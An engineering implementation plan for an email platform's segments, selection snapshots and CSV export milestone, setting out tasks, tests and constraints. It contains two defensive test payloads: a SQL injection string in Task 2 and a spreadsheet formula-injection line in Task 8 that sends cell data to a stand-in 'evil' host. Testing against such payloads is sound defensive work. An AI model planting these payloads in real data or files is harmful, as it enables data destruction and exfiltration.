# M1b implementation plan — segments, selection snapshots and export

**Spec:** `.scratch/email-platform/specs/2026-11-12-m1b-segments.md` — the binding authority.
Conflicts inside this plan resolve against it.
**Reviews:** `.scratch/email-platform/specs/2026-11-12-m1b-spec-review.md` — two passes; the first
killed an earlier design, the second cleared this one and found nine defects now folded in. Read
the second before Task 5.
**Branch:** `m1b-segments`, cut from `main` at the M1a merge.
**Prior art:** `.scratch/email-platform/m1a-decisions.md` and `m0-decisions.md`. Read both.

14 tasks. M1a ran 17 and that was stated as the limit.

---

## Global Constraints

Everything in M0's and M1a's constraints still applies. Restated because they are load-bearing:

**Environment**
- Windows cannot link Rust. Every `cargo` / `sqlx` / `pnpm` command runs in the Linux dev
  container: `bash scripts/dev.sh <command>`, which sets `CARGO_BUILD_JOBS=2`. **Do not raise it**
  — unthrottled linking took the Docker engine down three times.
- `web/dist` is compiled into the binary by rust-embed (`src/http/web_ui.rs`). After
  `pnpm -C web build` you must `cargo build --release --bin nm`, or the e2e runs the previous UI.
- **Never pipe a build to `/dev/null`.** A silent `tsc -b` failure leaves a stale `dist`;
  `gen:api`'s truncating `>` can empty a committed file.
- Never stop, modify or remove the containers `oci-email-postgres` or `marketing-automation`.
  Always compose project `-p nm`. If the engine wedges, stop and report — do not restart Docker.
- The e2e harness may only touch databases matching `nm_e2e_[0-9a-f]{12}`. Leave none behind.
- Playwright runs serial: a failing test **skips** the rest of its file rather than passing it.
  Use `--no-fail-fast` on cargo when "only that test failed" must mean something.
- Run `worst-case-data.spec.ts` as a whole file; `-g every_screen` skips its seed and fails
  spuriously.
- Restore a mutation by snapshotting the file first. `git checkout --` restores **committed** work
  only and will discard an uncommitted feature.

**After any change to a route or its types**
- `bash scripts/dev.sh pnpm -C web gen:api`, commit `openapi.json` and `schema.d.ts`.
- `bash scripts/dev.sh cargo sqlx prepare -- --all-targets`, commit `.sqlx/`.
- Every `operationId` must be unique; `src/openapi.rs` has a test.

**Data rules**
- IDs are UUIDv7 minted in Rust. `workspace_id` on every tenant table; composite FKs
  `(workspace_id, id)`. Spec §8.6 records this milestone's one deliberate exception.
- Every request body and signed payload carries `#[serde(deny_unknown_fields)]`.
- `contacts` has no status column. `mailable_list_members` is the only eligibility definition.

**Testing**
- Every assertion added must be shown to fail against deliberately broken code, and the report
  must say what was broken and what went red. Nine vacuous assertions were found in M1a.

---

## Review Focus

For every task: tenancy (404 before 403), `deny_unknown_fields`, role gating that is structural
rather than cosmetic, and whether each new test discriminates. For Tasks 2, 5 and 6 additionally:
whether any caller-supplied text can reach SQL as text, and whether any path can act on a contact
outside the snapshot.

---

## Task 1: The segment rule AST

**Files:** `src/segments/mod.rs` (new), `src/segments/rules.rs` (new). Tests in the same module.

- [ ] `RuleNode` is an enum of `Rule` and `Group`, never both — spec §4.1. Both carry
      `#[serde(deny_unknown_fields)]`.
- [ ] Parse enforces: depth ≤ 3, ≤ 50 rules per segment, ≤ 20 per group. Each is `422` with a
      distinct problem type, never truncation.
- [ ] **An empty `rules` array is `422 empty-rules` at every level** (§4.1). Test it at the top
      level and nested in a group.
- [ ] Field parsing resolves against the whitelist in §4.2; `attr:<key>` keeps the key as a
      `String`. An unknown field is `422 unknown-field`.
- [ ] Operators are validated against the field's kind (§4.3); an operator outside the kind's set
      is `422`. `opened`/`clicked`/`bounced`/`sent` parse and return `422 not-yet-available`.
- [ ] Tests: each limit, empty rules at both levels, unknown field, wrong-kind operator, a
      reserved engagement field, and a round-trip of a valid document.

## Task 2: The compiler — AST to parameterised SQL

**Files:** `src/segments/compile.rs` (new). Tests `tests/segments_compile.rs` (new).

Depends on Task 1.

- [ ] Compile a parsed AST into a `sqlx::QueryBuilder` fragment. **Every value, including every
      attribute key, goes through `push_bind`** (§4.4). Attribute keys bind as `&str` — `->>` is
      overloaded on `text` and `integer`, and another inferred type picks the array-index
      overload.
- [ ] A field resolves to a **fixed** SQL fragment chosen by a match on the whitelist. There must
      be no branch that writes a caller-supplied identifier.
- [ ] Negation compiles to `NOT EXISTS`, never a negated join (§4.5). Negative text operators on a
      `contacts` column compile to `(col is null or col not ilike …)`.
- [ ] Casts follow the **definition's** kind, not the value's shape.
- [ ] **Tests that must exist, each shown to fail if the protection is removed:**
      - an attribute key of `plan'); drop table contacts; --` compiles, runs, matches nothing, and
        `contacts` still exists
      - for **every** negative operator: a contact with zero related rows matches, and a contact
        with a NULL column value matches
      - a **structural** test that the compiled SQL always carries a restriction beyond
        `workspace_id`
- [ ] Use `#[sqlx::test]` and assert against real rows, not string equality on generated SQL.

## Task 3: Segments CRUD

**Files:** `migrations/0016_segments.sql`, `src/segments/routes.rs`, `src/custom_fields/routes.rs`
(the purge refusal), `src/http/mod.rs`. Tests `tests/segments.rs`.

Depends on Tasks 1–2. **Routers merge in `src/http/mod.rs::routes()`** — a `.merge()` in
`src/app.rs` lands after the CSRF layer and silently loses CSRF enforcement.

- [ ] Migration 0016 exactly as spec §7.
- [ ] CRUD with M1a conventions: cursor pagination `{data, next_cursor}`, RFC 9457, 404 before
      403, `deny_unknown_fields`, distinct handler names for unique `operationId`s.
- [ ] **`rules` is replaced wholesale on `PATCH`** (§12): a `PATCH` carrying `rules` must carry
      the whole document; a partial one is `422`. RFC 7386 would merge it recursively and
      silently keep the old array under a flipped connective.
- [ ] **The version bump is `rules is distinct from $new::jsonb`**, not a text comparison — jsonb
      reorders keys. Test that a rename does **not** bump the version and a rule change does.
- [ ] **`purge_custom_field` refuses while a live segment names the key**, listing them (§19).
- [ ] Roles: viewer reads, editor writes.

## Task 4: Preview and counts

**Files:** `src/segments/preview.rs`, `src/segments/routes.rs`, `src/http/rate_limit.rs` (extend).
Tests in `tests/segments.rs`.

Depends on Tasks 2–3.

- [ ] `POST /segments/preview` returns `{count, exact, took_ms}` per §5.
- [ ] The count runs in a transaction with `SET LOCAL statement_timeout = '1500ms'`. On timeout,
      open a **fresh** transaction — the timed-out one is aborted — and read `EXPLAIN (FORMAT
      JSON)` of the **row-producing select**, from the **top** node.
- [ ] **A rule set containing any `attr:` rule returns `count: null, exact: false`** and never a
      planner number (§5): with no statistics for `->>` the estimate measured 66× low.
- [ ] Rate-limit preview per workspace, with `RateLimit` headers.
- [ ] **Tests:** a cheap segment is `exact: true`; an expensive one is `exact: false` without
      erroring or hanging; **the timeout test asserts the preview actually timed out** — `SET
      LOCAL` outside a transaction is a `WARNING` that leaves the timeout at `0`, so the test
      passes vacuously otherwise; and a normal query on the same pool afterwards is not subject
      to the short timeout.

## Task 5: Selection snapshots

**Files:** `migrations/0017_selection_snapshots.sql`, `src/contacts/selection.rs`,
`src/contacts/routes.rs`. Tests `tests/selection_snapshots.rs`.

Depends on Task 2. **Read the second spec review before starting.**

- [ ] Migration 0017 exactly as §7, including `unlogged` on the members table and `filter jsonb`
      on the parent.
- [ ] `POST /contacts/selection` materialises matching ids (§8.2), `limit 1000001`; if the extra
      row arrives, roll back and return `422 selection-too-large` saying *more than 1,000,000* —
      **do not name an exact count**, which needs a second pass that doubles the work and races.
- [ ] `snapshot_id` is `Uuid::now_v7()` (§8.5) so the issue time comes back for free.
- [ ] `size` is the insert's own `rows_affected`, and parent and members commit in **one**
      transaction.
- [ ] A new selection **supersedes the actor's previous live one** in the same workspace (§8.4).
- [ ] Rate-limit the endpoint at least as hard as preview.
- [ ] The reaper is **its own bounded sweep deleting one expired snapshot per pass** (§8.10) —
      not M0's session sweep, which is sized for a 200-byte row and runs only while someone is
      logged in.
- [ ] **Tests:** the cap refuses without claiming an exact count; a new selection supersedes the
      old; `size` equals the rows written; the sweep deletes one and leaves the rest.

## Task 6: Rewire the bulk engine onto snapshots

**Files:** `src/contacts/selection.rs`, `src/contacts/routes.rs`, `src/crypto/mod.rs` (label),
`docs/adr/0004-*.md` (new), `docs/adr/0003-*.md` (mark superseded). Tests `tests/bulk.rs`.

Depends on Task 5. This is the task where a mistake is a data-loss bug; it gets the most capable
model and the hardest review.

- [ ] The token becomes `{workspace_id, snapshot_id, issued}`; signing label `nm:selection:v2` →
      **`v3`**; no `serde(default)` on any field.
- [ ] **The action narrows `contacts`, it never reads ids out of the members table** (§8.2).
      Reading ids out and inserting them elsewhere hits a foreign-key violation the moment one
      selected contact has been deleted, killing the whole action.
- [ ] The `sel` CTE joins `selection_snapshots … and expires_at > now()` (§8.5), so expiry does
      not depend on the reaper.
- [ ] **The widening guard becomes `selected > issued`** (§8.9). The old
      `selected + excluded.len() > issued` fires a spurious `409` whenever an excluded id is not
      in the snapshot — the most ordinary action on the grid.
- [ ] **Issue `03` closes here** (§9.2): the client sends the size it displayed and the server
      rejects the action if it disagrees with `selection_snapshots.size`.
- [ ] The bulk audit row copies `selection_snapshots.filter`, with `q` **redacted** (§8.7).
- [ ] `Selection::of_ids` is unchanged and carries no `snapshot_id`.
- [ ] **ADR 0004** carries the new design, the two measured counterexamples that killed the
      timestamp variant, and §8.4's cost table. **ADR 0003 is marked superseded and kept.** The
      doc comments on `Selection` and `Selection::widened` carry the superseded argument and must
      be rewritten.
- [ ] Add a comment at `selection::subscribe` recording that **freezing is safe because subscribe
      is `on conflict do nothing`** (§8.3) — `lists::add_member` is already `do update`, and
      aligning them would turn freezing into a re-subscription bug with no warning.
- [ ] **Tests:** a tag applied after selection does not bring its contact in; a tag removed after
      it does not take one out; `not_has` and `not_member_of` **in both directions**; deleting a
      selected contact leaves the action working and the count short; an expired-but-unswept
      snapshot is refused; a v2 token is refused; **`refuse_if_widened` never fires**, including
      with exclusions outside the snapshot; the audit row carries the predicate, no `q`, and
      survives the snapshot's deletion.

## Task 7: Issue `08` — `remove` becomes `unsubscribe`

**Files:** `src/lists/routes.rs`, `src/lists/mod.rs`, `src/audit/mod.rs`, `web/src/**`,
`GLOSSARY.md`. Tests: existing lists tests, updated.

Independent of Tasks 1–6; can run any time after Task 3's router work lands.

- [ ] Route, handler names and audit action renamed per §11.
- [ ] **Existing audit rows keep `LIST_MEMBER_REMOVED`.** Rewriting history makes the log a worse
      record. Test both strings read correctly.
- [ ] Glossary carries both names, noting which superseded which.

## Task 8: Export

**Files:** `src/contacts/export.rs` (new), `src/contacts/routes.rs`. Tests `tests/export.rs`.

Depends on Task 2 (for `segment_id` in the filter).

- [ ] Streamed CSV, never buffered — a 10M-row export must not hold memory proportional to the
      result.
- [ ] **CSV formula injection neutralised** (§10): any cell starting `=`, `+`, `-`, `@`, tab or CR
      is prefixed with a single quote. A `first_name` of `=HYPERLINK("http://evil/?x="&A1,"click")`
      is settable through any signup form and executes when an admin opens the file.
- [ ] Audited: actor, filter, row count; **no `q`**.
- [ ] `Role::Admin`.
- [ ] **Tests:** memory does not grow with row count; formula cells are prefixed; the audit row
      exists and carries no `q`; an editor is refused.

## Task 9: Membership provenance

**Files:** `migrations/0018_membership_provenance.sql`, `src/lists/mod.rs`,
`src/contacts/selection.rs`. Tests: existing lists and bulk tests, extended.

Independent.

- [ ] Migration 0018 per §7: `source text` **nullable, no default**, with the `check` constraint.
      A `not null default 'api'` would backfill every existing row with a false provenance in the
      very migration that creates the column.
- [ ] Every membership writer sets it: `ui`, `api`, `bulk`. (`import` and `form` arrive in M1c
      and M1d.)
- [ ] Test that each writer records the right source and that existing rows read as NULL.

## Task 10: Web — segments list and rule builder

**Files:** `web/src/routes/segments.tsx` (new), `web/src/components/rule-builder.tsx` (new),
`web/src/router.tsx`. Tests `web/e2e/segments.spec.ts` (new).

Depends on Tasks 3–4. Write the failing e2e first.

- [ ] Segments list: name, description, a live count loaded per row **without blocking the list**,
      created by, updated. Empty state explains what a segment is in one sentence.
- [ ] Rule builder: groups with all/any; field picker driven by live definitions; operator picker
      driven by the field's kind; value control matching the kind.
- [ ] **Deleting the last rule in a group removes the group**, rather than leaving an empty one
      the API refuses (§4.1, §14).
- [ ] The count updates on a debounce and never blocks typing.
- [ ] `lazyRouteComponent`; tokens, not hardcoded colours; no new dependency.

## Task 11: Web — counts, the frozen set, and confirmation copy

**Files:** `web/src/routes/contacts.tsx`, `web/src/routes/segments.tsx`,
`web/src/components/rule-builder.tsx`. Tests extend `segments.spec.ts` and
`audience-admin.spec.ts`.

Depends on Tasks 6 and 10.

- [ ] Counts render exact plain, `~12,400` where an estimate is honest, and **"too many to count
      exactly"** where §5 says no estimate is.
- [ ] **"Here is what you selected":** once a selection exists the grid shows the frozen set via
      `?snapshot_id=…`. This removes the divergence between the live grid and the snapshot at
      source, which is what forced §8.9's arithmetic fix.
- [ ] **"Select all matching" is never offered from an estimate** — the click costs five seconds
      and may end in `422 selection-too-large`.
- [ ] The bulk-tag confirmation says what tagging will mean once a campaign can target a tag
      (§9.1).
- [ ] The `422 selection-too-large` path renders the server's sentence, not a generic failure.

## Task 12: Web — export

**Files:** `web/src/routes/contacts.tsx`, a new dialog. Tests extend `audience-admin.spec.ts`.

Depends on Task 8.

- [ ] Confirmation names the row count and that the file contains personal data.
- [ ] Admin-only, with the control **absent** rather than disabled for everyone else.
- [ ] Test that an editor never sees it and that the download starts.

## Task 13: The worst-case and accessibility pass

**Files:** `web/e2e/worst-case-data.spec.ts`, plus fixes it finds. Tests: itself.

Depends on Tasks 10–12. In M1a the equivalent task found real layout breakage, so it is a task and
not a checklist item.

- [ ] Add every new screen and dialog to `SCREENS`, using the `opens()` helper. The `<dialog>`
      `scrollWidth > clientWidth` rule from M1a already covers them.
- [ ] Seed worst-case data: a 100-character custom field label, a 254-character email, a
      100-character segment name, a 50-rule segment.
- [ ] Axe-clean in both themes at 320 px, 640 px and desktop, and at 200 % zoom.
- [ ] Report what broke and what was fixed. If nothing breaks, say what was checked.

## Task 14: Glossary, decision record and the gates

**Files:** `GLOSSARY.md`, `.scratch/email-platform/m1b-decisions.md` (new), issue files.

Last.

- [ ] Glossary gains: segment, rule, selection snapshot, frozen set, provenance.
- [ ] `m1b-decisions.md` in the shape of `m1a-decisions.md`: what was decided, why, what it costs
      if wrong. The two dead designs belong in it — a reader needs to know the timestamp bound was
      tried and why it failed, or someone will propose it again.
- [ ] Close issues `03`, `04` and `08`; update `09` and `11` if anything changed.
- [ ] Run the full gate set and report every exit code.
